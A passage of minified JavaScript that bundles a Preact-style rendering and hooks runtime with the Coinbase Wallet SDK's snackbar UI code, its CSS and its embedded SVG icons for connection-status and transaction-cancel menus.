r=="number")i+=r;else if(typeof r=="object")if(Array.isArray(r))for(e=0;e<r.length;e++)r[e]&&(t=qne(r[e]))&&(i&&(i+=" "),i+=t);else for(e in r)r[e]&&(i&&(i+=" "),i+=e);return i}function V5(){for(var r,e,t=0,i="";t<arguments.length;)(r=arguments[t++])&&(e=qne(r))&&(i&&(i+=" "),i+=e);return i}var uE,bn,zne,h1,bV,Wne,Hne,Vne,tB,lP,uP,Ny={},Kne=[],BQe=/acit|ex(?:s|g|n|p|$)|rph|grid|ows|mnc|ntw|ine[ch]|zoo|^ord|itera/i,dE=Array.isArray;function Qh(r,e){for(var t in e)r[t]=e[t];return r}function rB(r){r&&r.parentNode&&r.parentNode.removeChild(r)}function Ki(r,e,t){var i,n,s,o={};for(s in e)s=="key"?i=e[s]:s=="ref"?n=e[s]:o[s]=e[s];if(arguments.length>2&&(o.children=arguments.length>3?uE.call(arguments,2):t),typeof r=="function"&&r.defaultProps!=null)for(s in r.defaultProps)o[s]===void 0&&(o[s]=r.defaultProps[s]);return _9(r,o,i,n,null)}function _9(r,e,t,i,n){var s={type:r,props:e,key:t,ref:i,__k:null,__:null,__b:0,__e:null,__c:null,constructor:void 0,__v:n??++zne,__i:-1,__u:0};return n==null&&bn.vnode!=null&&bn.vnode(s),s}function hE(r){return r.children}function S9(r,e){this.props=r,this.context=e}function Qw(r,e){if(e==null)return r.__?Qw(r.__,r.__i+1):null;for(var t;e<r.__k.length;e++)if((t=r.__k[e])!=null&&t.__e!=null)return t.__e;return typeof r.type=="function"?Qw(r):null}function Gne(r){var e,t;if((r=r.__)!=null&&r.__c!=null){for(r.__e=r.__c.base=null,e=0;e<r.__k.length;e++)if((t=r.__k[e])!=null&&t.__e!=null){r.__e=r.__c.base=t.__e;break}return Gne(r)}}function vV(r){(!r.__d&&(r.__d=!0)&&h1.push(r)&&!ix.__r++||bV!=bn.debounceRendering)&&((bV=bn.debounceRendering)||Wne)(ix)}function ix(){for(var r,e,t,i,n,s,o,a=1;h1.length;)h1.length>a&&h1.sort(Hne),r=h1.shift(),a=h1.length,r.__d&&(t=void 0,n=(i=(e=r).__v).__e,s=[],o=[],e.__P&&((t=Qh({},i)).__v=i.__v+1,bn.vnode&&bn.vnode(t),iB(e.__P,t,i,e.__n,e.__P.namespaceURI,32&i.__u?[n]:null,s,n??Qw(i),!!(32&i.__u),o),t.__v=i.__v,t.__.__k[t.__i]=t,Jne(s,t,o),t.__e!=n&&Gne(t)));ix.__r=0}function Zne(r,e,t,i,n,s,o,a,c,l,u){var d,h,f,p,g,w,m=i&&i.__k||Kne,x=e.length;for(c=MQe(t,e,m,c,x),d=0;d<x;d++)(f=t.__k[d])!=null&&(h=f.__i==-1?Ny:m[f.__i]||Ny,f.__i=d,w=iB(r,f,h,n,s,o,a,c,l,u),p=f.__e,f.ref&&h.ref!=f.ref&&(h.ref&&nB(h.ref,null,f),u.push(f.ref,f.__c||p,f)),g==null&&p!=null&&(g=p),4&f.__u||h.__k===f.__k?c=Yne(f,c,r):typeof f.type=="function"&&w!==void 0?c=w:p&&(c=p.nextSibling),f.__u&=-7);return t.__e=g,c}function MQe(r,e,t,i,n){var s,o,a,c,l,u=t.length,d=u,h=0;for(r.__k=new Array(n),s=0;s<n;s++)(o=e[s])!=null&&typeof o!="boolean"&&typeof o!="function"?(c=s+h,(o=r.__k[s]=typeof o=="string"||typeof o=="number"||typeof o=="bigint"||o.constructor==String?_9(null,o,null,null,null):dE(o)?_9(hE,{children:o},null,null,null):o.constructor==null&&o.__b>0?_9(o.type,o.props,o.key,o.ref?o.ref:null,o.__v):o).__=r,o.__b=r.__b+1,a=null,(l=o.__i=DQe(o,t,c,d))!=-1&&(d--,(a=t[l])&&(a.__u|=2)),a==null||a.__v==null?(l==-1&&(n>u?h--:n<u&&h++),typeof o.type!="function"&&(o.__u|=4)):l!=c&&(l==c-1?h--:l==c+1?h++:(l>c?h--:h++,o.__u|=4))):r.__k[s]=null;if(d)for(s=0;s<u;s++)(a=t[s])!=null&&(2&a.__u)==0&&(a.__e==i&&(i=Qw(a)),Xne(a,a));return i}function Yne(r,e,t){var i,n;if(typeof r.type=="function"){for(i=r.__k,n=0;i&&n<i.length;n++)i[n]&&(i[n].__=r,e=Yne(i[n],e,t));return e}r.__e!=e&&(e&&r.type&&!t.contains(e)&&(e=Qw(r)),t.insertBefore(r.__e,e||null),e=r.__e);do e=e&&e.nextSibling;while(e!=null&&e.nodeType==8);return e}function DQe(r,e,t,i){var n,s,o=r.key,a=r.type,c=e[t];if(c===null&&r.key==null||c&&o==c.key&&a==c.type&&(2&c.__u)==0)return t;if(i>(c!=null&&(2&c.__u)==0?1:0))for(n=t-1,s=t+1;n>=0||s<e.length;){if(n>=0){if((c=e[n])&&(2&c.__u)==0&&o==c.key&&a==c.type)return n;n--}if(s<e.length){if((c=e[s])&&(2&c.__u)==0&&o==c.key&&a==c.type)return s;s++}}return-1}function yV(r,e,t){e[0]=="-"?r.setProperty(e,t??""):r[e]=t==null?"":typeof t!="number"||BQe.test(e)?t:t+"px"}function S8(r,e,t,i,n){var s,o;e:if(e=="style")if(typeof t=="string")r.style.cssText=t;else{if(typeof i=="string"&&(r.style.cssText=i=""),i)for(e in i)t&&e in t||yV(r.style,e,"");if(t)for(e in t)i&&t[e]==i[e]||yV(r.style,e,t[e])}else if(e[0]=="o"&&e[1]=="n")s=e!=(e=e.replace(Vne,"$1")),o=e.toLowerCase(),e=o in r||e=="onFocusOut"||e=="onFocusIn"?o.slice(2):e.slice(2),r.l||(r.l={}),r.l[e+s]=t,t?i?t.u=i.u:(t.u=tB,r.addEventListener(e,s?uP:lP,s)):r.removeEventListener(e,s?uP:lP,s);else{if(n=="http://www.w3.org/2000/svg")e=e.replace(/xlink(H|:h)/,"h").replace(/sName$/,"s");else if(e!="width"&&e!="height"&&e!="href"&&e!="list"&&e!="form"&&e!="tabIndex"&&e!="download"&&e!="rowSpan"&&e!="colSpan"&&e!="role"&&e!="popover"&&e in r)try{r[e]=t??"";break e}catch{}typeof t=="function"||(t==null||t===!1&&e[4]!="-"?r.removeAttribute(e):r.setAttribute(e,e=="popover"&&t==1?"":t))}}function xV(r){return function(e){if(this.l){var t=this.l[e.type+r];if(e.t==null)e.t=tB++;else if(e.t<t.u)return;return t(bn.event?bn.event(e):e)}}}function iB(r,e,t,i,n,s,o,a,c,l){var u,d,h,f,p,g,w,m,x,S,T,k,I,E,C,N,L,$=e.type;if(e.constructor!=null)return null;128&t.__u&&(c=!!(32&t.__u),s=[a=e.__e=t.__e]),(u=bn.__b)&&u(e);e:if(typeof $=="function")try{if(m=e.props,x="prototype"in $&&$.prototype.render,S=(u=$.contextType)&&i[u.__c],T=u?S?S.props.value:u.__:i,t.__c?w=(d=e.__c=t.__c).__=d.__E:(x?e.__c=d=new $(m,T):(e.__c=d=new S9(m,T),d.constructor=$,d.render=UQe),S&&S.sub(d),d.props=m,d.state||(d.state={}),d.context=T,d.__n=i,h=d.__d=!0,d.__h=[],d._sb=[]),x&&d.__s==null&&(d.__s=d.state),x&&$.getDerivedStateFromProps!=null&&(d.__s==d.state&&(d.__s=Qh({},d.__s)),Qh(d.__s,$.getDerivedStateFromProps(m,d.__s))),f=d.props,p=d.state,d.__v=e,h)x&&$.getDerivedStateFromProps==null&&d.componentWillMount!=null&&d.componentWillMount(),x&&d.componentDidMount!=null&&d.__h.push(d.componentDidMount);else{if(x&&$.getDerivedStateFromProps==null&&m!==f&&d.componentWillReceiveProps!=null&&d.componentWillReceiveProps(m,T),!d.__e&&d.shouldComponentUpdate!=null&&d.shouldComponentUpdate(m,d.__s,T)===!1||e.__v==t.__v){for(e.__v!=t.__v&&(d.props=m,d.state=d.__s,d.__d=!1),e.__e=t.__e,e.__k=t.__k,e.__k.some(function(y){y&&(y.__=e)}),k=0;k<d._sb.length;k++)d.__h.push(d._sb[k]);d._sb=[],d.__h.length&&o.push(d);break e}d.componentWillUpdate!=null&&d.componentWillUpdate(m,d.__s,T),x&&d.componentDidUpdate!=null&&d.__h.push(function(){d.componentDidUpdate(f,p,g)})}if(d.context=T,d.props=m,d.__P=r,d.__e=!1,I=bn.__r,E=0,x){for(d.state=d.__s,d.__d=!1,I&&I(e),u=d.render(d.props,d.state,d.context),C=0;C<d._sb.length;C++)d.__h.push(d._sb[C]);d._sb=[]}else do d.__d=!1,I&&I(e),u=d.render(d.props,d.state,d.context),d.state=d.__s;while(d.__d&&++E<25);d.state=d.__s,d.getChildContext!=null&&(i=Qh(Qh({},i),d.getChildContext())),x&&!h&&d.getSnapshotBeforeUpdate!=null&&(g=d.getSnapshotBeforeUpdate(f,p)),N=u,u!=null&&u.type===hE&&u.key==null&&(N=Qne(u.props.children)),a=Zne(r,dE(N)?N:[N],e,t,i,n,s,o,a,c,l),d.base=e.__e,e.__u&=-161,d.__h.length&&o.push(d),w&&(d.__E=d.__=null)}catch(y){if(e.__v=null,c||s!=null)if(y.then){for(e.__u|=c?160:128;a&&a.nodeType==8&&a.nextSibling;)a=a.nextSibling;s[s.indexOf(a)]=null,e.__e=a}else for(L=s.length;L--;)rB(s[L]);else e.__e=t.__e,e.__k=t.__k;bn.__e(y,e,t)}else s==null&&e.__v==t.__v?(e.__k=t.__k,e.__e=t.__e):a=e.__e=LQe(t.__e,e,t,i,n,s,o,c,l);return(u=bn.diffed)&&u(e),128&e.__u?void 0:a}function Jne(r,e,t){for(var i=0;i<t.length;i++)nB(t[i],t[++i],t[++i]);bn.__c&&bn.__c(e,r),r.some(function(n){try{r=n.__h,n.__h=[],r.some(function(s){s.call(n)})}catch(s){bn.__e(s,n.__v)}})}function Qne(r){return typeof r!="object"||r==null||r.__b&&r.__b>0?r:dE(r)?r.map(Qne):Qh({},r)}function LQe(r,e,t,i,n,s,o,a,c){var l,u,d,h,f,p,g,w=t.props,m=e.props,x=e.type;if(x=="svg"?n="http://www.w3.org/2000/svg":x=="math"?n="http://www.w3.org/1998/Math/MathML":n||(n="http://www.w3.org/1999/xhtml"),s!=null){for(l=0;l<s.length;l++)if((f=s[l])&&"setAttribute"in f==!!x&&(x?f.localName==x:f.nodeType==3)){r=f,s[l]=null;break}}if(r==null){if(x==null)return document.createTextNode(m);r=document.createElementNS(n,x,m.is&&m),a&&(bn.__m&&bn.__m(e,s),a=!1),s=null}if(x==null)w===m||a&&r.data==m||(r.data=m);else{if(s=s&&uE.call(r.childNodes),w=t.props||Ny,!a&&s!=null)for(w={},l=0;l<r.attributes.length;l++)w[(f=r.attributes[l]).name]=f.value;for(l in w)if(f=w[l],l!="children"){if(l=="dangerouslySetInnerHTML")d=f;else if(!(l in m)){if(l=="value"&&"defaultValue"in m||l=="checked"&&"defaultChecked"in m)continue;S8(r,l,null,f,n)}}for(l in m)f=m[l],l=="children"?h=f:l=="dangerouslySetInnerHTML"?u=f:l=="value"?p=f:l=="checked"?g=f:a&&typeof f!="function"||w[l]===f||S8(r,l,f,w[l],n);if(u)a||d&&(u.__html==d.__html||u.__html==r.innerHTML)||(r.innerHTML=u.__html),e.__k=[];else if(d&&(r.innerHTML=""),Zne(e.type=="template"?r.content:r,dE(h)?h:[h],e,t,i,x=="foreignObject"?"http://www.w3.org/1999/xhtml":n,s,o,s?s[0]:t.__k&&Qw(t,0),a,c),s!=null)for(l=s.length;l--;)rB(s[l]);a||(l="value",x=="progress"&&p==null?r.removeAttribute("value"):p!=null&&(p!==r[l]||x=="progress"&&!p||x=="option"&&p!=w[l])&&S8(r,l,p,w[l],n),l="checked",g!=null&&g!=r[l]&&S8(r,l,g,w[l],n))}return r}function nB(r,e,t){try{if(typeof r=="function"){var i=typeof r.__u=="function";i&&r.__u(),i&&e==null||(r.__u=r(e))}else r.current=e}catch(n){bn.__e(n,t)}}function Xne(r,e,t){var i,n;if(bn.unmount&&bn.unmount(r),(i=r.ref)&&(i.current&&i.current!=r.__e||nB(i,null,e)),(i=r.__c)!=null){if(i.componentWillUnmount)try{i.componentWillUnmount()}catch(s){bn.__e(s,e)}i.base=i.__P=null}if(i=r.__k)for(n=0;n<i.length;n++)i[n]&&Xne(i[n],e,t||typeof r.type!="function");t||rB(r.__e),r.__c=r.__=r.__e=void 0}function UQe(r,e,t){return this.constructor(r,t)}function dP(r,e,t){var i,n,s,o;e==document&&(e=document.documentElement),bn.__&&bn.__(r,e),n=(i=!1)?null:e.__k,s=[],o=[],iB(e,r=e.__k=Ki(hE,null,[r]),n||Ny,Ny,e.namespaceURI,n?null:e.firstChild?uE.call(e.childNodes):null,s,n?n.__e:e.firstChild,i,o),Jne(s,r,o)}uE=Kne.slice,bn={__e:function(r,e,t,i){for(var n,s,o;e=e.__;)if((n=e.__c)&&!n.__)try{if((s=n.constructor)&&s.getDerivedStateFromError!=null&&(n.setState(s.getDerivedStateFromError(r)),o=n.__d),n.componentDidCatch!=null&&(n.componentDidCatch(r,i||{}),o=n.__d),o)return n.__E=n}catch(a){r=a}throw r}},zne=0,S9.prototype.setState=function(r,e){var t;t=this.__s!=null&&this.__s!=this.state?this.__s:this.__s=Qh({},this.state),typeof r=="function"&&(r=r(Qh({},t),this.props)),r&&Qh(t,r),r!=null&&this.__v&&(e&&this._sb.push(e),vV(this))},S9.prototype.forceUpdate=function(r){this.__v&&(this.__e=!0,r&&this.__h.push(r),vV(this))},S9.prototype.render=hE,h1=[],Wne=typeof Promise=="function"?Promise.prototype.then.bind(Promise.resolve()):setTimeout,Hne=function(r,e){return r.__v.__b-e.__v.__b},ix.__r=0,Vne=/(PointerCapture)$|Capture$/i,tB=0,lP=xV(!1),uP=xV(!0);var nx,Yn,XI,CV,hP=0,ese=[],cs=bn,EV=cs.__b,_V=cs.__r,SV=cs.diffed,AV=cs.__c,IV=cs.unmount,TV=cs.__;function tse(r,e){cs.__h&&cs.__h(Yn,r,hP||e),hP=0;var t=Yn.__H||(Yn.__H={__:[],__h:[]});return r>=t.__.length&&t.__.push({}),t.__[r]}function kV(r){return hP=1,jQe(rse,r)}function jQe(r,e,t){var i=tse(nx++,2);if(i.t=r,!i.__c&&(i.__=[rse(void 0,e),function(a){var c=i.__N?i.__N[0]:i.__[0],l=i.t(c,a);c!==l&&(i.__N=[l,i.__[1]],i.__c.setState({}))}],i.__c=Yn,!Yn.__f)){var n=function(a,c,l){if(!i.__c.__H)return!0;var u=i.__c.__H.__.filter(function(h){return!!h.__c});if(u.every(function(h){return!h.__N}))return!s||s.call(this,a,c,l);var d=i.__c.props!==a;return u.forEach(function(h){if(h.__N){var f=h.__[0];h.__=h.__N,h.__N=void 0,f!==h.__[0]&&(d=!0)}}),s&&s.call(this,a,c,l)||d};Yn.__f=!0;var s=Yn.shouldComponentUpdate,o=Yn.componentWillUpdate;Yn.componentWillUpdate=function(a,c,l){if(this.__e){var u=s;s=void 0,n(a,c,l),s=u}o&&o.call(this,a,c,l)},Yn.shouldComponentUpdate=n}return i.__N||i.__}function FQe(r,e){var t=tse(nx++,3);!cs.__s&&WQe(t.__H,e)&&(t.__=r,t.u=e,Yn.__H.__h.push(t))}function qQe(){for(var r;r=ese.shift();)if(r.__P&&r.__H)try{r.__H.__h.forEach(A9),r.__H.__h.forEach(fP),r.__H.__h=[]}catch(e){r.__H.__h=[],cs.__e(e,r.__v)}}cs.__b=function(r){Yn=null,EV&&EV(r)},cs.__=function(r,e){r&&e.__k&&e.__k.__m&&(r.__m=e.__k.__m),TV&&TV(r,e)},cs.__r=function(r){_V&&_V(r),nx=0;var e=(Yn=r.__c).__H;e&&(XI===Yn?(e.__h=[],Yn.__h=[],e.__.forEach(function(t){t.__N&&(t.__=t.__N),t.u=t.__N=void 0})):(e.__h.forEach(A9),e.__h.forEach(fP),e.__h=[],nx=0)),XI=Yn},cs.diffed=function(r){SV&&SV(r);var e=r.__c;e&&e.__H&&(e.__H.__h.length&&(ese.push(e)!==1&&CV===cs.requestAnimationFrame||((CV=cs.requestAnimationFrame)||zQe)(qQe)),e.__H.__.forEach(function(t){t.u&&(t.__H=t.u),t.u=void 0})),XI=Yn=null},cs.__c=function(r,e){e.some(function(t){try{t.__h.forEach(A9),t.__h=t.__h.filter(function(i){return!i.__||fP(i)})}catch(i){e.some(function(n){n.__h&&(n.__h=[])}),e=[],cs.__e(i,t.__v)}}),AV&&AV(r,e)},cs.unmount=function(r){IV&&IV(r);var e,t=r.__c;t&&t.__H&&(t.__H.__.forEach(function(i){try{A9(i)}catch(n){e=n}}),t.__H=void 0,e&&cs.__e(e,t.__v))};var NV=typeof requestAnimationFrame=="function";function zQe(r){var e,t=function(){clearTimeout(i),NV&&cancelAnimationFrame(e),setTimeout(r)},i=setTimeout(t,35);NV&&(e=requestAnimationFrame(t))}function A9(r){var e=Yn,t=r.__c;typeof t=="function"&&(r.__c=void 0,t()),Yn=e}function fP(r){var e=Yn;r.__c=r.__(),Yn=e}function WQe(r,e){return!r||r.length!==e.length||e.some(function(t,i){return t!==r[i]})}function rse(r,e){return typeof e=="function"?e(r):e}const HQe=".-cbwsdk-css-reset .-gear-container{margin-left:16px !important;margin-right:9px !important;display:flex;align-items:center;justify-content:center;width:24px;height:24px;transition:opacity .25s}.-cbwsdk-css-reset .-gear-container *{user-select:none}.-cbwsdk-css-reset .-gear-container svg{opacity:0;position:absolute}.-cbwsdk-css-reset .-gear-icon{height:12px;width:12px;z-index:10000}.-cbwsdk-css-reset .-cbwsdk-snackbar{align-items:flex-end;display:flex;flex-direction:column;position:fixed;right:0;top:0;z-index:2147483647}.-cbwsdk-css-reset .-cbwsdk-snackbar *{user-select:none}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance{display:flex;flex-direction:column;margin:8px 16px 0 16px;overflow:visible;text-align:left;transform:translateX(0);transition:opacity .25s,transform .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header:hover .-gear-container svg{opacity:1}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header{display:flex;align-items:center;background:#fff;overflow:hidden;border:1px solid #e7ebee;box-sizing:border-box;border-radius:8px;cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header-cblogo{margin:8px 8px 8px 8px}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header *{cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header-message{color:#000;font-size:13px;line-height:1.5;user-select:none}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu{background:#fff;transition:opacity .25s ease-in-out,transform .25s linear,visibility 0s;visibility:hidden;border:1px solid #e7ebee;box-sizing:border-box;border-radius:8px;opacity:0;flex-direction:column;padding-left:8px;padding-right:8px}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:last-child{margin-bottom:8px !important}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:hover{background:#f5f7f8;border-radius:6px;transition:background .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:hover span{color:#050f19;transition:color .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:hover svg path{fill:#000;transition:fill .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item{visibility:inherit;height:35px;margin-top:8px;margin-bottom:0;display:flex;flex-direction:row;align-items:center;padding:8px;cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item *{visibility:inherit;cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover{background:rgba(223,95,103,.2);transition:background .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover *{cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover svg path{fill:#df5f67;transition:fill .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover span{color:#df5f67;transition:color .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-info{color:#aaa;font-size:13px;margin:0 8px 0 32px;position:absolute}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-hidden{opacity:0;text-align:left;transform:translateX(25%);transition:opacity .5s linear}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-expanded .-cbwsdk-snackbar-instance-menu{opacity:1;display:flex;transform:translateY(8px);visibility:visible}",VQe="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzIiIGhlaWdodD0iMzIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTEuNDkyIDEwLjQxOWE4LjkzIDguOTMgMCAwMTguOTMtOC45M2gxMS4xNjNhOC45MyA4LjkzIDAgMDE4LjkzIDguOTN2MTEuMTYzYTguOTMgOC45MyAwIDAxLTguOTMgOC45M0gxMC40MjJhOC45MyA4LjkzIDAgMDEtOC45My04LjkzVjEwLjQxOXoiIGZpbGw9IiMxNjUyRjAiLz48cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTEwLjQxOSAwSDIxLjU4QzI3LjMzNSAwIDMyIDQuNjY1IDMyIDEwLjQxOVYyMS41OEMzMiAyNy4zMzUgMjcuMzM1IDMyIDIxLjU4MSAzMkgxMC40MkM0LjY2NSAzMiAwIDI3LjMzNSAwIDIxLjU4MVYxMC40MkMwIDQuNjY1IDQuNjY1IDAgMTAuNDE5IDB6bTAgMS40ODhhOC45MyA4LjkzIDAgMDAtOC45MyA4LjkzdjExLjE2M2E4LjkzIDguOTMgMCAwMDguOTMgOC45M0gyMS41OGE4LjkzIDguOTMgMCAwMDguOTMtOC45M1YxMC40MmE4LjkzIDguOTMgMCAwMC04LjkzLTguOTNIMTAuNDJ6IiBmaWxsPSIjZmZmIi8+PHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xNS45OTggMjYuMDQ5Yy01LjU0OSAwLTEwLjA0Ny00LjQ5OC0xMC4wNDctMTAuMDQ3IDAtNS41NDggNC40OTgtMTAuMDQ2IDEwLjA0Ny0xMC4wNDYgNS41NDggMCAxMC4wNDYgNC40OTggMTAuMDQ2IDEwLjA0NiAwIDUuNTQ5LTQuNDk4IDEwLjA0Ny0xMC4wNDYgMTAuMDQ3eiIgZmlsbD0iI2ZmZiIvPjxwYXRoIGQ9Ik0xMi43NjIgMTQuMjU0YzAtLjgyMi42NjctMS40ODkgMS40ODktMS40ODloMy40OTdjLjgyMiAwIDEuNDg4LjY2NiAxLjQ4OCAxLjQ4OXYzLjQ5N2MwIC44MjItLjY2NiAxLjQ4OC0xLjQ4OCAxLjQ4OGgtMy40OTdhMS40ODggMS40ODggMCAwMS0xLjQ4OS0xLjQ4OHYtMy40OTh6IiBmaWxsPSIjMTY1MkYwIi8+PC9zdmc+",KQe="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTIiIGhlaWdodD0iMTIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHBhdGggZD0iTTEyIDYuNzV2LTEuNWwtMS43Mi0uNTdjLS4wOC0uMjctLjE5LS41Mi0uMzItLjc3bC44MS0xLjYyLTEuMDYtMS4wNi0xLjYyLjgxYy0uMjQtLjEzLS41LS4yNC0uNzctLjMyTDYuNzUgMGgtMS41bC0uNTcgMS43MmMtLjI3LjA4LS41My4xOS0uNzcuMzJsLTEuNjItLjgxLTEuMDYgMS4wNi44MSAxLjYyYy0uMTMuMjQtLjI0LjUtLjMyLjc3TDAgNS4yNXYxLjVsMS43Mi41N2MuMDguMjcuMTkuNTMuMzIuNzdsLS44MSAxLjYyIDEuMDYgMS4wNiAxLjYyLS44MWMuMjQuMTMuNS4yMy43Ny4zMkw1LjI1IDEyaDEuNWwuNTctMS43MmMuMjctLjA4LjUyLS4xOS43Ny0uMzJsMS42Mi44MSAxLjA2LTEuMDYtLjgxLTEuNjJjLjEzLS4yNC4yMy0uNS4zMi0uNzdMMTIgNi43NXpNNiA4LjVhMi41IDIuNSAwIDAxMC01IDIuNSAyLjUgMCAwMTAgNXoiIGZpbGw9IiMwNTBGMTkiLz48L3N2Zz4=";class GQe{constructor(){this.items=new Map,this.nextItemKey=0,this.root=null,this.darkMode=jne()}attach(e){this.root=document.createElement("div"),this.root.className="-cbwsdk-snackbar-root",e.appendChild(this.root),this.render()}presentItem(e){const t=this.nextItemKey++;return this.items.set(t,e),this.render(),()=>{this.items.delete(t),this.render()}}clear(){this.items.clear(),this.render()}render(){this.root&&dP(Ki("div",null,Ki(ise,{darkMode:this.darkMode},Array.from(this.items.entries()).map(([e,t])=>Ki(ZQe,Object.assign({},t,{key:e}))))),this.root)}}const ise=r=>Ki("div",{class:V5("-cbwsdk-snackbar-container")},Ki("style",null,HQe),Ki("div",{class:"-cbwsdk-snackbar"},r.children)),ZQe=({autoExpand:r,message:e,menuItems:t})=>{const[i,n]=kV(!0),[s,o]=kV(r??!1);FQe(()=>{const c=[window.setTimeout(()=>{n(!1)},1),window.setTimeout(()=>{o(!0)},1e4)];return()=>{c.forEach(window.clearTimeout)}});const a=()=>{o(!s)};return Ki("div",{class:V5("-cbwsdk-snackbar-instance",i&&"-cbwsdk-snackbar-instance-hidden",s&&"-cbwsdk-snackbar-instance-expanded")},Ki("div",{class:"-cbwsdk-snackbar-instance-header",onClick:a},Ki("img",{src:VQe,class:"-cbwsdk-snackbar-instance-header-cblogo"})," ",Ki("div",{class:"-cbwsdk-snackbar-instance-header-message"},e),Ki("div",{class:"-gear-container"},!s&&Ki("svg",{width:"24",height:"24",viewBox:"0 0 24 24",fill:"none",xmlns:"http://www.w3.org/2000/svg"},Ki("circle",{cx:"12",cy:"12",r:"12",fill:"#F5F7F8"})),Ki("img",{src:KQe,class:"-gear-icon",title:"Expand"}))),t&&t.length>0&&Ki("div",{class:"-cbwsdk-snackbar-instance-menu"},t.map((c,l)=>Ki("div",{class:V5("-cbwsdk-snackbar-instance-menu-item",c.isRed&&"-cbwsdk-snackbar-instance-menu-item-is-red"),onClick:c.onClick,key:l},Ki("svg",{width:c.svgWidth,height:c.svgHeight,viewBox:"0 0 10 11",fill:"none",xmlns:"http://www.w3.org/2000/svg"},Ki("path",{"fill-rule":c.defaultFillRule,"clip-rule":c.defaultClipRule,d:c.path,fill:"#AAAAAA"})),Ki("span",{class:V5("-cbwsdk-snackbar-instance-menu-item-info",c.isRed&&"-cbwsdk-snackbar-instance-menu-item-info-is-red")},c.info)))))};class YQe{constructor(){this.attached=!1,this.snackbar=new GQe}attach(){if(this.attached)throw new Error("Coinbase Wallet SDK UI is already attached");const e=document.documentElement,t=document.createElement("div");t.className="-cbwsdk-css-reset",e.appendChild(t),this.snackbar.attach(t),this.attached=!0,Fne()}showConnecting(e){let t;return e.isUnlinkedErrorState?t={autoExpand:!0,message:"Connection lost",menuItems:[{isRed:!1,info:"Reset connection",svgWidth:"10",svgHeight:"11",path:"M5.00008 0.96875C6.73133 0.96875 8.23758 1.94375 9.00008 3.375L10.0001 2.375V5.5H9.53133H7.96883H6.87508L7.80633 4.56875C7.41258 3.3875 6.31258 2.53125 5.00008 2.53125C3.76258 2.53125 2.70633 3.2875 2.25633 4.36875L0.812576 3.76875C1.50008 2.125 3.11258 0.96875 5.00008 0.96875ZM2.19375 6.43125C2.5875 7.6125 3.6875 8.46875 5 8.46875C6.2375 8.46875 7.29375 7.7125 7.74375 6.63125L9.1875 7.23125C8.5 8.875 6.8875 10.0312 5 10.0312C3.26875 10.0312 1.7625 9.05625 1 7.625L0 8.625V5.5H0.46875H2.03125H3.125L2.19375 6.43125Z",defaultFillRule:"evenodd",defaultClipRule:"evenodd",onClick:e.onResetConnection}]}:t={message:"Confirm on phone",menuItems:[{isRed:!0,info:"Cancel transaction",svgWidth:"11",svgHeight:"11",path:"M10.3711 1.52346L9.21775 0.370117L5.37109 4.21022L1.52444 0.370117L0.371094 1.52346L4.2112 5.37012L0.371094 9.21677L1.52444 10.3701L5.37109 6.53001L9.21775 10.3701L10.3711 9.21677L6.53099 5.37012L10.3711 1.52346Z",defaultFillRule:"inherit",defaultClipRule:"inherit",onClick:e.onCancel},{isRed:!1,info:"Reset connection",svgWidth:"10",svgHeight:"11",path:"M5.00008 0.96875C6.73133 0.96875 8.23758 1.94375 9.00008 3.375L10.0001 2.375V5.5H9.53133H7.96883H6.87508L7.80633 4.56875C7.41258 3.3875 6.31258 2.53125 5.00008 2.53125C3.76258 2.53125 2.70633 3.2875 2.25633 4.36875L0.812576 3.76875C1.50008 2.125 3.11258 0.96875 5.00008 0.96875ZM2.19375 6.43125C2.5875 7.6125 3.6875 8.46875 5 8.46875C6.2375 8.46875 7.29375 7.7125 7.74375 6.63125L9.1875 7.23125C8.5 8.875 6.8875 10.0312 5 10.0312C3.26875 10.0312 1.7625 9.05625 1 7.625L0 8.625V5.5H0.46875H2.03125H3.125L2.19375 6.43125Z",defaultFillRule:"evenodd",defaultClipRule:"evenodd",onClick:e.onResetConnection}]},this.snackbar.presentItem(t)}}const JQe=".-cbwsdk-css-reset .-cbwsdk-redirect-dialog-backdrop{position:fixed;top:0;left:0;right:0;bottom:0;transition:opacity .25s;background-color:rgba(10,11,13,.5)}.-cbwsdk-css-reset .-cbwsdk-redirect-dialog-backdrop-hidden{opacity:0}.-cbwsdk-css-reset .-cbwsdk-redirect-dialog-box{display:block;position:fixed;top:50%;left:50%;transform:translate(-50%, -50%);padding:20px;border-radius:8px;background-color:#fff;color:#0a0b0d}.-cbwsdk-css-reset .-cbwsdk-redirect-dialog-box p{display:block;font-weight:400;font-size:14px;line-height:20px;padding-bottom:12px;color:#5b636e}.-cbwsdk-css-reset .-cbwsdk-redirect-dialog-box 